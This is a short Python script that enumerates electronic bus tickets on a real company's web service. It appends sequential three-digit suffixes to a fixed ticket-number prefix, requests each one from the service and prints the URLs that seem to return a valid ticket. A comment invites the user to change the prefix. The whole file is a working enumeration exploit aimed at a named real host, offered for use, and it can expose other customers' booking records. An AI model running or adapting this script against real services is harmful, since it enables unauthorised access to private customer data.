import requests
url = 'http://www.ado.com.mx/ado2/WSCCPA/BOLWS/BoletosElectronico'
'''
You can modify the prefix variable to a smaller or larger value,
this value is used only for reference and because it works.
'''
prefix = '200021956'

for counter in range(1,20):
	sufix = str(counter).zfill(3)
	numero = prefix + sufix
	r = requests.get(url, params = {'numero':numero})
	if not 'Content-Length' in r.headers:
		print r.url